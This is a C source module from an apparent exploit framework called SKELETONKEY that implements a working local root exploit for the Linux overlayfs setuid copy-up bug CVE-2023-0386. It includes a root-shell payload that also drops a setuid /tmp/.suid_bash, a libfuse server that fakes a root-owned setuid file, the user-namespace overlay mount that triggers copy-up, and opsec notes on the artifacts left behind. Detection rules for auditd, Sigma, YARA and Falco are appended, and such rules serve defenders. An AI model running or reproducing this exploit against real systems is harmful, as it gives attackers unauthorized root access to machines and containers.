/*
 * overlayfs_setuid_cve_2023_0386 — SKELETONKEY module
 *
 * **Different bug than CVE-2021-3493.** That one was Ubuntu-specific
 * (their modified overlayfs). This one is upstream: overlayfs copy-up
 * preserves the setuid/setgid bit AND the lower file's root ownership
 * even when the task triggering copy-up is only root inside a user
 * namespace. Faithful port of the public PoC (xkaneiki):
 *
 *   1. Compile a small setuid payload ELF (setuid(0) + drop a root shell).
 *   2. Serve it via a FUSE filesystem as "/file" reporting st_uid=0,
 *      st_mode=04777. libfuse mounts through the setuid fusermount helper,
 *      i.e. in the INIT namespace — required, because overlay refuses a
 *      userns-mounted FUSE lowerdir (ENOSYS).
 *   3. In a child: unshare(USER|NS), map root, mount overlayfs with the
 *      FUSE mount as lowerdir and attacker-owned upper/work dirs.
 *   4. open(merged/file, O_WRONLY) triggers copy-up. The bug materialises
 *      upper/file on the REAL filesystem as a genuine setuid-ROOT binary.
 *   5. The parent (real unprivileged user) execs upper/file → real root.
 *
 * The FUSE server must implement getattr + read + read_buf + ioctl: copy-up
 * uses the splice path (read_buf) and issues FS_IOC_GETFLAGS (ioctl) on the
 * lower; a server missing either returns ENOSYS and copy-up fails.
 *
 * Discovered by Xkaneiki (2023). Mainline fix: 4f11ada10d0 ("ovl:
 * fail on invalid uid/gid mapping at copy up") landed in 6.3.
 *
 * STATUS: 🟢 FULL detect + exploit + cleanup. VM-verified landing real root
 *   on Ubuntu 22.04.0 / 5.15.0-25 (see docs/EXPLOITED.md).
 *
 * Affected: kernel 5.11 ≤ K < 6.3. Backports:
 *   6.2.x  : K >= 6.2.13
 *   6.1.x  : K >= 6.1.27
 *   5.15.x : K >= 5.15.110
 *
 * Preconditions:
 *   - Unprivileged user_ns + mount_ns
 *   - libfuse (linked at build) + the setuid fusermount(3) helper + a C
 *     compiler at runtime (to build the payload ELF)
 *
 * Coverage rationale: complements CVE-2021-3493 — that one is
 * Ubuntu-specific, this one is general. Real-world overlayfs LPE
 * for any distro running 5.11-6.2 kernels. Container-escape relevant.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>

static const struct kernel_patched_from overlayfs_setuid_patched_branches[] = {
    {5, 10, 179},   /* 5.10.x stable backport (per Debian tracker — bullseye) */
    {5, 15, 110},
    {6,  1,  11},   /* Debian tracker: earlier than 6.1.27 */
    {6,  2,  13},
    {6,  3,   0},   /* mainline */
};

static const struct kernel_range overlayfs_setuid_range = {
    .patched_from = overlayfs_setuid_patched_branches,
    .n_patched_from = sizeof(overlayfs_setuid_patched_branches) /
                      sizeof(overlayfs_setuid_patched_branches[0]),
};

/* The unprivileged-userns precondition is now read from the shared
 * host fingerprint (ctx->host->unprivileged_userns_allowed), which
 * probes once at startup via core/host.c. The previous per-detect
 * fork-probe helper was removed. */

static const char *find_setuid_in_lower(void)
{
    static const char *targets[] = {
        "/usr/bin/su", "/usr/bin/passwd", "/usr/bin/sudo",
        "/usr/bin/chsh", "/usr/bin/chfn", "/bin/su", NULL,
    };
    for (size_t i = 0; targets[i]; i++) {
        struct stat st;
        if (stat(targets[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            return targets[i];
        }
    }
    return NULL;
}

static skeletonkey_result_t overlayfs_setuid_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] overlayfs_setuid: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug introduced in 5.11 when ovl copy-up was generalized.
     * Pre-5.11 immune via a different code path. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 5, 11, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: kernel %s predates the bug "
                            "(introduced in 5.11)\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool patched = kernel_range_is_patched(&overlayfs_setuid_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }

    bool userns_ok = ctx->host ? ctx->host->unprivileged_userns_allowed : false;
    if (!ctx->json) {
        fprintf(stderr, "[i] overlayfs_setuid: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] overlayfs_setuid: user_ns+mount_ns clone: %s\n",
                userns_ok ? "ALLOWED" : "DENIED");
    }

    if (!userns_ok) {
        if (!ctx->json) {
            fprintf(stderr, "[+] overlayfs_setuid: user_ns denied → unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    const char *target = find_setuid_in_lower();
    if (!target) {
        if (!ctx->json) {
            fprintf(stderr, "[?] overlayfs_setuid: no setuid binary found in standard paths\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] overlayfs_setuid: VULNERABLE — exploit target = %s\n", target);
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Embedded payload + exploit ---------------------------------- */

static const char OVERLAYFS_SU_PAYLOAD[] =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n"
    "int main(void) {\n"
    "    setresuid(0,0,0); setresgid(0,0,0);\n"
    "    if (geteuid() != 0) { perror(\"setresuid\"); return 1; }\n"
    "    (void)!system(\"cp /bin/bash /tmp/.suid_bash 2>/dev/null; chmod 4755 /tmp/.suid_bash 2>/dev/null; \"\n"
    "                  \"id > /tmp/skeletonkey-ovlsu-pwned 2>/dev/null; chmod 644 /tmp/skeletonkey-ovlsu-pwned\");\n"
    "    char *env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
    "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, env);\n"
    "    return 1;\n"
    "}\n";

static bool which_gcc(char *out_path, size_t outsz)
{
    static const char *cands[] = {
        "/usr/bin/gcc", "/usr/bin/cc", "/bin/gcc", "/bin/cc", NULL,
    };
    for (size_t i = 0; cands[i]; i++) {
        if (access(cands[i], X_OK) == 0) {
            strncpy(out_path, cands[i], outsz - 1);
            out_path[outsz - 1] = 0;
            return true;
        }
    }
    return false;
}

static bool write_file_str(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    size_t n = strlen(content);
    bool ok = (write(fd, content, n) == (ssize_t)n);
    close(fd);
    return ok;
}

/* ------------------------------------------------------------------
 * CVE-2023-0386 — faithful port of the public exploit (xkaneiki), using
 * libfuse to export a setuid-root lower layer.
 *
 * The bug: overlayfs copy-up preserves the SUID bit and the lower file's
 * root ownership even when the task triggering it is only root inside a user
 * namespace. We serve a FUSE filesystem whose single file "file" reports
 * st_uid=0, st_mode=04777; overlay copy-up then materialises it in the real
 * upper dir as a genuine setuid-root binary, which we exec for real root.
 *
 * Why libfuse (and not a raw /dev/fuse server): overlay REFUSES a
 * userns-mounted FUSE lowerdir (ENOSYS), so the FUSE fs must be mounted in the
 * init namespace via the setuid fusermount helper — which libfuse drives. A
 * hand-rolled raw protocol server proved fragile enough to destabilise the
 * kernel on malformed replies; libfuse is the robust, proven path (matches the
 * upstream PoC). Built conditionally: without libfuse the module stubs out.
 * ------------------------------------------------------------------ */

#ifdef OVLSU_HAVE_FUSE

#ifdef OVLSU_FUSE3
#define FUSE_USE_VERSION 31
#else
#define FUSE_USE_VERSION 29
#endif
#include <fuse.h>
#include <signal.h>

/* The setuid-root ELF the FUSE "file" serves (loaded once, pre-fork). */
static unsigned char *g_ovlsu_elf;
static size_t         g_ovlsu_elf_len;

#ifdef OVLSU_FUSE3
static int ovlsu_getattr(const char *path, struct stat *st, struct fuse_file_info *fi)
#else
static int ovlsu_getattr(const char *path, struct stat *st)
#endif
{
#ifdef OVLSU_FUSE3
    (void)fi;
#endif
    memset(st, 0, sizeof *st);
    if (strcmp(path, "/") == 0) {
        st->st_mode = S_IFDIR | 0755; st->st_nlink = 2;
        return 0;
    }
    if (strcmp(path, "/file") == 0) {
        st->st_mode = S_IFREG | 04777;   /* <-- setuid/setgid/sticky */
        st->st_nlink = 1;
        st->st_uid = 0; st->st_gid = 0;  /* <-- root-owned: the crux */
        st->st_size = (off_t)g_ovlsu_elf_len;
        return 0;
    }
    return -ENOENT;
}

#ifdef OVLSU_FUSE3
static int ovlsu_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                         off_t off, struct fuse_file_info *fi,
                         enum fuse_readdir_flags flags)
{
    (void)off; (void)fi; (void)flags;
    if (strcmp(path, "/") != 0) return -ENOENT;
    filler(buf, ".", NULL, 0, 0); filler(buf, "..", NULL, 0, 0);
    filler(buf, "file", NULL, 0, 0);
    return 0;
}
#else
static int ovlsu_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                         off_t off, struct fuse_file_info *fi)
{
    (void)off; (void)fi;
    if (strcmp(path, "/") != 0) return -ENOENT;
    filler(buf, ".", NULL, 0); filler(buf, "..", NULL, 0);
    filler(buf, "file", NULL, 0);
    return 0;
}
#endif

static int ovlsu_open(const char *path, struct fuse_file_info *fi)
{
    (void)fi;
    return (strcmp(path, "/file") == 0) ? 0 : -ENOENT;
}

static int ovlsu_read(const char *path, char *buf, size_t size, off_t off,
                      struct fuse_file_info *fi)
{
    (void)fi;
    if (strcmp(path, "/file") != 0) return -ENOENT;
    if ((size_t)off >= g_ovlsu_elf_len) return 0;
    size_t n = g_ovlsu_elf_len - (size_t)off;
    if (n > size) n = size;
    memcpy(buf, g_ovlsu_elf + off, n);
    return (int)n;
}

/* read_buf: REQUIRED for overlay copy-up. Overlay copies the lower file up via
 * the kernel's splice / copy_file_range path, which maps to the FUSE read_buf
 * op; without it the copy returns ENOSYS and copy-up fails. We hand back a
 * memory-backed bufvec referencing the payload. */
static int ovlsu_read_buf(const char *path, struct fuse_bufvec **bufp,
                          size_t size, off_t off, struct fuse_file_info *fi)
{
    (void)fi;
    if (strcmp(path, "/file") != 0) return -ENOENT;
    struct fuse_bufvec *src = malloc(sizeof *src);
    if (!src) return -ENOMEM;
    *src = (struct fuse_bufvec)FUSE_BUFVEC_INIT(size);
    char *data = malloc(size ? size : 1);
    if (!data) { free(src); return -ENOMEM; }
    memset(data, 0, size);
    size_t avail = ((size_t)off < g_ovlsu_elf_len) ? g_ovlsu_elf_len - (size_t)off : 0;
    size_t give = size < avail ? size : avail;
    memcpy(data, g_ovlsu_elf + off, give);
    /* Present exactly as the public PoC's read_buf: a memory buffer flagged
     * FUSE_BUF_FD_SEEK with pos=off — this is the shape libfuse's splice path
     * (used by overlay copy-up) accepts; a plain flags=0 mem buffer yields
     * ENOSYS at copy-up. */
    src->buf[0].flags = FUSE_BUF_FD_SEEK;
    src->buf[0].pos = off;
    src->buf[0].mem = data;
    *bufp = src;
    return 0;
}

/* ioctl: REQUIRED. overlay copy-up issues FS_IOC_GETFLAGS (an ioctl) on the
 * lower file to copy inode flags; without an ioctl handler FUSE returns ENOSYS
 * and copy-up fails ENOSYS. Returning success (as the public PoC does) lets
 * copy-up proceed. */
#ifdef OVLSU_FUSE3
static int ovlsu_ioctl(const char *path, unsigned int cmd, void *arg,
                       struct fuse_file_info *fi, unsigned int flags, void *data)
#else
static int ovlsu_ioctl(const char *path, int cmd, void *arg,
                       struct fuse_file_info *fi, unsigned int flags, void *data)
#endif
{
    (void)path; (void)cmd; (void)arg; (void)fi; (void)flags; (void)data;
    return 0;
}

static struct fuse_operations ovlsu_ops = {
    .getattr  = ovlsu_getattr,
    .readdir  = ovlsu_readdir,
    .open     = ovlsu_open,
    .read     = ovlsu_read,
    .read_buf = ovlsu_read_buf,
    .ioctl    = ovlsu_ioctl,
};

/* Run the FUSE server (blocks) mounting at `mp`, serving one setuid-root
 * /file. Returns when unmounted. libfuse mounts via the setuid fusermount
 * helper — i.e. in the init namespace, which is exactly what overlay needs.
 *
 * We use the low-level fuse_mount + fuse_new + fuse_loop_mt with EMPTY args
 * (exactly as the public PoC does) rather than fuse_main(). fuse_main parses a
 * default option set that advertises extra capabilities (splice /
 * copy_file_range) to the kernel; the kernel then attempts copy_file_range on
 * the FUSE lower during overlay copy-up, gets ENOSYS, and does NOT fall back —
 * so copy-up fails. The minimal fuse_new below advertises none of that, so the
 * kernel uses the plain read path (our read/read_buf) and copy-up succeeds. */
#ifdef OVLSU_FUSE3
static int ovlsu_fuse_serve(const char *mp)
{
    char *argv[] = { (char *)"ovlsu-fuse", (char *)mp, NULL };
    struct fuse_args args = FUSE_ARGS_INIT(2, argv);
    struct fuse *fuse = fuse_new(&args, &ovlsu_ops, sizeof ovlsu_ops, NULL);
    if (!fuse) { fuse_opt_free_args(&args); return -1; }
    if (fuse_mount(fuse, mp) != 0) { fuse_destroy(fuse); fuse_opt_free_args(&args); return -1; }
    fuse_set_signal_handlers(fuse_get_session(fuse));
    int r = fuse_loop_mt(fuse, NULL);
    fuse_unmount(fuse); fuse_destroy(fuse); fuse_opt_free_args(&args);
    return r;
}
#else
static int ovlsu_fuse_serve(const char *mp)
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan *chan = fuse_mount(mp, &args);
    if (!chan) return -1;
    struct fuse *fuse = fuse_new(chan, &args, &ovlsu_ops, sizeof ovlsu_ops, NULL);
    if (!fuse) { fuse_unmount(mp, chan); return -1; }
    fuse_set_signal_handlers(fuse_get_session(fuse));
    fuse_loop_mt(fuse);
    fuse_unmount(mp, chan);
    fuse_destroy(fuse);
    return 0;
}
#endif

static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = overlayfs_setuid_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] overlayfs_setuid: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) { fprintf(stderr, "[i] overlayfs_setuid: already root\n"); return SKELETONKEY_OK; }

    char gcc[256];
    if (!which_gcc(gcc, sizeof gcc)) {
        fprintf(stderr, "[-] overlayfs_setuid: no C compiler to build the setuid payload\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    char workdir[128];
    snprintf(workdir, sizeof workdir, "/tmp/skeletonkey-ovlsu-XXXXXX");
    if (!mkdtemp(workdir)) { perror("mkdtemp"); return SKELETONKEY_TEST_ERROR; }

    char lower[160], upper[160], work[160], merged[160], payc[176], gcbin[176], carrier[176], mfile[176];
    snprintf(lower,  sizeof lower,  "%s/lower",  workdir);
    snprintf(upper,  sizeof upper,  "%s/upper",  workdir);
    snprintf(work,   sizeof work,   "%s/work",   workdir);
    snprintf(merged, sizeof merged, "%s/merged", workdir);
    snprintf(payc,   sizeof payc,   "%s/p.c",    workdir);
    snprintf(gcbin,  sizeof gcbin,  "%s/gc",     workdir);
    snprintf(carrier,sizeof carrier,"%s/file",   upper);
    snprintf(mfile,  sizeof mfile,  "%s/file",   merged);
    mkdir(lower, 0755); mkdir(upper, 0755); mkdir(work, 0755); mkdir(merged, 0755);

    /* Build the setuid payload ELF. It drops a witness (setuid /tmp/.suid_bash
     * + an id sentinel) so success is observable non-interactively, then execs
     * a root shell. */
    if (!write_file_str(payc, OVERLAYFS_SU_PAYLOAD)) { fprintf(stderr, "[-] write payload.c\n"); goto fail; }
    { pid_t g = fork();
      if (g == 0) { execl(gcc, gcc, "-O2", "-w", "-o", gcbin, payc, (char *)NULL); _exit(127); }
      int st; waitpid(g, &st, 0);
      if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) { fprintf(stderr, "[-] gcc failed building payload\n"); goto fail; } }

    { int f = open(gcbin, O_RDONLY); if (f < 0) { perror("open payload elf"); goto fail; }
      struct stat st; if (fstat(f, &st) != 0) { close(f); goto fail; }
      g_ovlsu_elf_len = (size_t)st.st_size;
      g_ovlsu_elf = malloc(g_ovlsu_elf_len ? g_ovlsu_elf_len : 1);
      if (!g_ovlsu_elf || read(f, g_ovlsu_elf, g_ovlsu_elf_len) != (ssize_t)g_ovlsu_elf_len) { close(f); goto fail; }
      close(f); }

    if (!ctx->json)
        fprintf(stderr, "[*] overlayfs_setuid: FUSE-serving a setuid-root /file (libfuse), overlay "
                        "copy-up into %s (CVE-2023-0386)\n", upper);

    /* Fork the FUSE server (init-ns mount via the setuid fusermount helper). */
    pid_t fpid = fork();
    if (fpid < 0) { perror("fork fuse"); goto fail; }
    if (fpid == 0) {
        /* quiesce libfuse chatter unless --json off */
        int nfd = open("/dev/null", O_WRONLY); if (nfd >= 0) { dup2(nfd, 2); close(nfd); }
        ovlsu_fuse_serve(lower);
        _exit(0);
    }

    /* Wait for the FUSE mount to answer. */
    int ready = 0;
    for (int i = 0; i < 300; i++) {
        struct stat sf; char fp[176]; snprintf(fp, sizeof fp, "%s/file", lower);
        if (stat(fp, &sf) == 0) { ready = 1; break; }
        usleep(10000);
    }
    if (!ready) {
        fprintf(stderr, "[-] overlayfs_setuid: FUSE mount did not come up (fusermount missing/denied?)\n");
        kill(fpid, SIGKILL); waitpid(fpid, NULL, 0);
        goto fail;
    }

    /* Exploit child: userns + overlay(lower=fuse) + copy-up. */
    pid_t xpid = fork();
    if (xpid < 0) { perror("fork exploit"); kill(fpid, SIGKILL); waitpid(fpid, NULL, 0); goto fail; }
    if (xpid == 0) {
        uid_t ou = getuid(); gid_t og = getgid();     /* BEFORE unshare */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
        { int f = open("/proc/self/setgroups", O_WRONLY); if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
          char m[64];
          int fu = open("/proc/self/uid_map", O_WRONLY); if (fu >= 0) { int n = snprintf(m, sizeof m, "0 %u 1", ou); (void)!write(fu, m, n); close(fu); }
          int fg = open("/proc/self/gid_map", O_WRONLY); if (fg >= 0) { int n = snprintf(m, sizeof m, "0 %u 1", og); (void)!write(fg, m, n); close(fg); } }

        char oo[640];
        snprintf(oo, sizeof oo, "lowerdir=%s,upperdir=%s,workdir=%s", lower, upper, work);
        if (mount("overlay", merged, "overlay", 0, oo) < 0) { perror("mount overlay"); _exit(6); }

        /* Trigger copy-up: opening the merged file copies it from the FUSE
         * lower into the real upper, preserving setuid + root uid. */
        int cf = open(mfile, O_WRONLY | O_CREAT, 0666); if (cf >= 0) close(cf);
        _exit(0);
    }
    waitpid(xpid, NULL, 0);

    /* Tear the FUSE mount down now that copy-up is done (upper/file persists
     * on the real fs). */
    { char cmd[400];
      snprintf(cmd, sizeof cmd, "fusermount3 -u '%s' 2>/dev/null || fusermount -u '%s' 2>/dev/null", lower, lower);
      (void)!system(cmd); }
    kill(fpid, SIGKILL); waitpid(fpid, NULL, 0);

    struct stat us;
    if (stat(carrier, &us) != 0) {
        if (!ctx->json)
            fprintf(stderr, "[-] overlayfs_setuid: copy-up did not materialise %s — kernel may be "
                            "patched\n", carrier);
        goto fail;
    }
    if (!ctx->json)
        fprintf(stderr, "[+] overlayfs_setuid: copy-up produced %s (uid=%u mode=%04o) — executing "
                        "as the real user\n", carrier, (unsigned)us.st_uid, (unsigned)(us.st_mode & 07777));

    if (ctx->no_shell) {
        fprintf(stderr, "[+] overlayfs_setuid: --no-shell — setuid-root carrier planted at %s\n", carrier);
        return SKELETONKEY_EXPLOIT_OK;
    }

    fflush(NULL);
    pid_t r = fork();
    if (r == 0) {
        int dn = open("/dev/null", O_RDONLY); if (dn >= 0) { dup2(dn, 0); close(dn); }
        execl(carrier, carrier, (char *)NULL);
        _exit(127);
    }
    waitpid(r, NULL, 0);

    struct stat ss;
    if ((stat("/tmp/.suid_bash", &ss) == 0 && (ss.st_mode & 04000)) ||
        stat("/tmp/skeletonkey-ovlsu-pwned", &ss) == 0) {
        if (!ctx->json) fprintf(stderr, "[+] overlayfs_setuid: ROOT — payload ran as uid 0\n");
        return SKELETONKEY_EXPLOIT_OK;
    }
    if (!ctx->json)
        fprintf(stderr, "[-] overlayfs_setuid: carrier ran but produced no root witness\n");

fail:
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !OVLSU_HAVE_FUSE — built without libfuse */

static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = overlayfs_setuid_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE && pre != SKELETONKEY_OK) return pre;
    fprintf(stderr, "[-] overlayfs_setuid: built WITHOUT libfuse — the CVE-2023-0386 exploit needs a "
                    "FUSE lower layer. Install libfuse3-dev (or libfuse-dev) and rebuild.\n");
    (void)OVERLAYFS_SU_PAYLOAD; (void)which_gcc; (void)write_file_str;
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* OVLSU_HAVE_FUSE */

static skeletonkey_result_t overlayfs_setuid_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (!ctx->json) {
        fprintf(stderr, "[*] overlayfs_setuid: removing /tmp/skeletonkey-ovlsu-*\n");
    }
    if (system("rm -rf /tmp/skeletonkey-ovlsu-* 2>/dev/null") != 0) { /* harmless */ }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: overlayfs copy-up / unshare(CLONE_NEWUSER|CLONE_NEWNS)
 * / mount("overlay", ...) are Linux-only. Stub out so the module still
 * registers and the top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t overlayfs_setuid_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] overlayfs_setuid: Linux-only module "
                "(overlayfs setuid copy-up) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t overlayfs_setuid_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] overlayfs_setuid: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t overlayfs_setuid_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

static const char overlayfs_setuid_auditd[] =
    "# overlayfs setuid copy-up (CVE-2023-0386) — auditd detection rules\n"
    "# Same surface as CVE-2021-3493; share the skeletonkey-overlayfs key.\n"
    "-a always,exit -F arch=b64 -S mount -F a2=overlay -k skeletonkey-overlayfs\n"
    "-a always,exit -F arch=b64 -S chown,fchown,fchownat -k skeletonkey-overlayfs-chown\n";

static const char overlayfs_setuid_sigma[] =
    "title: Possible CVE-2023-0386 overlayfs setuid copy-up\n"
    "id: 0891b2f7-skeletonkey-overlayfs-setuid\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the upstream overlayfs setuid copy-up bug: unshare\n"
    "  (CLONE_NEWUSER|CLONE_NEWNS) + mount('overlay') with a setuid-\n"
    "  root binary in lower + chown on the merged view to trigger\n"
    "  copy-up. Setuid bit persists in upper layer despite\n"
    "  unprivileged ownership.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns:    {type: 'SYSCALL', syscall: 'unshare'}\n"
    "  overlay:   {type: 'SYSCALL', syscall: 'mount'}\n"
    "  chown_up:  {type: 'SYSCALL', syscall: 'chown'}\n"
    "  condition: userns and overlay and chown_up\n"
    "level: critical\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2023.0386]\n";

static const char overlayfs_setuid_yara[] =
    "rule overlayfs_setuid_cve_2023_0386 : cve_2023_0386 userns_lpe\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2023-0386\"\n"
    "        description = \"overlayfs setuid copy-up workdir signature\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $work = /\\/tmp\\/skeletonkey-ovlsu-[A-Za-z0-9]+/\n"
    "    condition:\n"
    "        $work\n"
    "}\n";

static const char overlayfs_setuid_falco[] =
    "- rule: overlayfs chown on setuid binary in userns (copy-up)\n"
    "  desc: |\n"
    "    Non-root chown on a setuid-root binary inside an overlayfs\n"
    "    mount in a userns. Triggers copy-up that preserves the\n"
    "    setuid bit despite unprivileged upper-layer ownership.\n"
    "    CVE-2023-0386.\n"
    "  condition: >\n"
    "    evt.type in (chown, fchown, fchownat) and not user.uid = 0\n"
    "    and (fd.name in (/usr/bin/su, /bin/su, /usr/bin/sudo,\n"
    "                     /usr/bin/passwd, /usr/bin/pkexec)\n"
    "         or fd.name endswith /su)\n"
    "  output: >\n"
    "    chown on setuid binary by non-root\n"
    "    (user=%user.name pid=%proc.pid file=%fd.name)\n"
    "  priority: CRITICAL\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2023.0386]\n";

const struct skeletonkey_module overlayfs_setuid_module = {
    .name           = "overlayfs_setuid",
    .cve            = "CVE-2023-0386",
    .summary        = "overlayfs copy-up preserves setuid bit → host root via setuid carrier",
    .family         = "overlayfs",   /* same family as CVE-2021-3493 */
    .kernel_range   = "5.11 ≤ K < 6.3, backports: 6.2.13 / 6.1.27 / 5.15.110",
    .detect         = overlayfs_setuid_detect,
    .exploit        = overlayfs_setuid_exploit,
    .mitigate       = NULL,
    .cleanup        = overlayfs_setuid_cleanup,
    .detect_auditd  = overlayfs_setuid_auditd,
    .detect_sigma   = overlayfs_setuid_sigma,
    .detect_yara    = overlayfs_setuid_yara,
    .detect_falco   = overlayfs_setuid_falco,
    .opsec_notes    = "Faithful CVE-2023-0386 port: a libfuse filesystem exports a setuid-root /file (st_uid=0, mode 04777), mounted in the init ns via the setuid fusermount helper; then unshare(CLONE_NEWUSER|CLONE_NEWNS) + overlayfs mount with that FUSE mount as lowerdir; open(merged/file, O_WRONLY) triggers copy-up that materialises upper/file as a real setuid-root binary, which the unprivileged parent execs for root. Artifacts: /tmp/skeletonkey-ovlsu-XXXXXX/ (workdir: payload.c, the payload ELF, FUSE mount at lower/, overlay upper/work/merged), plus a setuid /tmp/.suid_bash and /tmp/skeletonkey-ovlsu-pwned witness dropped by the root payload; cleanup callback removes /tmp/skeletonkey-ovlsu-*. Audit-visible via mount(fuse) + fusermount execve + unshare(CLONE_NEWUSER|CLONE_NEWNS) + mount(overlay), then a setuid-root binary exec by a non-root uid. No network. Dmesg silent on success.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_overlayfs_setuid(void)
{
    skeletonkey_register(&overlayfs_setuid_module);
}
